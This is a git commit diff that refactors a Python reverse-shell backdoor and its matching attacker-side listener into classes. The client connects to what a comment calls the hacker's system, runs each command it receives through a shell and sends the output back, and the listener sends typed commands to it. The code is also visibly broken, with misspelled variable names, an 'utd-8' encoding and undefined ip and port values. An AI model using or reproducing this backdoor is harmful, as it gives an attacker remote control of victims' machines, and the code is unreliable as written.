4dfc745d046745520c4820fb225bbdbfdeae2359
V1ZEI-CN <vijaychowdary3699@gmail.com>
2021-12-16 18:21:51 +0530

    listener + client program in backdoor

--- backdoor/reverseBackdoor.py
+++ backdoor/reverseBackdoor.py
@@ -7,31 +7,35 @@ import sys
 import socket
 import subprocess
 
-def execute_system_commands(command):
-  return subprocess.check_output(command, shell=True)
+class Suspicious:
+  def __init__(self, ip, port):
+    # to create a socket we need to ceate an instance of it first
+    self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # this socket method takes two arguments, 1st the address family(read about it), 2nd is socket type
+    # in general if the connection is tcp connection then the type is sock_stream
+    self.connection.connect((ip, port))
+    # this send method requires data to be sent in bytes format
+    connetion.send("[+] Connection Success.\n".encode('utf-8'))
+  
+  def execute_system_commands(self, command):
+    return subprocess.check_output(command, shell=True)
+  
+  def start(self):
+    while True:
+      try:
+        # the argument is the amount of buffer size to store the data
+        data_received = connetion.recv(1024).decode('utf-8')
+        command_result = self.execute_system_commands(data_received)
+        connetion.send(command_result)
+      except subprocess.CalledProcessError as error:
+        connetion.send(error)
+        sys.exit()
+      except KeyboardInterrupt as error:
+        data = "\r[+] Keyboard Interrpution, quitting the program\n"
+        connetion.send(data.encode('utf-8'))
+        sys.exit()
+    self.connetion.close()
 
-# to create a socket we need to ceate an instance of it first
-connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# this socket method takes two arguments, 1st the address family(read about it), 2nd is socket type
-# in general if the connection is tcp connection then the type is sock_stream
-
-connection.connect(("<IP>", PORT_NUMBER))
-
-# this send method requires data to be sent in bytes format
-connetion.send("[+] Connection Success.\n".encode('utf-8'))
-
-while True:
-  try:
-    # the argument is the amount of buffer size to store the data
-    data_received = connetion.recv(1024).decode('utf-8')
-    command_result = execute_system_commands(data_received)
-    connetion.send(command_result)
-  except subprocess.CalledProcessError as error:
-    connetion.send(error)
-    sys.exit()
-  except KeyboardInterrupt as error:
-    data = "\r[+] Keyboard Interrpution, quitting the program\n"
-    connetion.send(data.encode('utf-8'))
-    sys.exit()
-
-connetion.close()
+# these ip and port values are of hackers system values
+backdoor = Suspicious(ip, port)
+backdoor.start()
--- backdoor/server_listener.py
+++ backdoor/server_listener.py
@@ -1,18 +1,24 @@
 import socket
 
+class Connections_Listener:
+  def __init__(self, ip, port):
+    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    listener.bind((ip, port))
+    listener.listen(0)
+    print("[+] Waiting for a connection")
+    self.connection, address = listener.accept()
+    print("[+] Got a connection")
+  
+  def remote_code_execution(self, command):
+    self.connection.send(command.encode('utd-8'))
+    return self.connection.recv(1024).decode('utf-8')
+  
+  def start(self):
+    while True:
+      input_command = input(">>> ")
+      result = self.remote_code_execution(input_command)
+      print(result)
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# listener.setsockopt(level, optname, value)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-listener.bind(("<Local IP>", port_number))
-listener.listen(0)
-print("[+] Waiting for a connection")
-connection, address = listener.accept()
-print("[+] Got a connection")
-
-while True:
-  input_command = input(">>> ")
-  connection.send(input_command.encode('utf-8'))
-  result = connection.recv(1024).decode('utf-8')
-  print(result)
+listen = Connections_Listener(ip, port)
+listen.start()
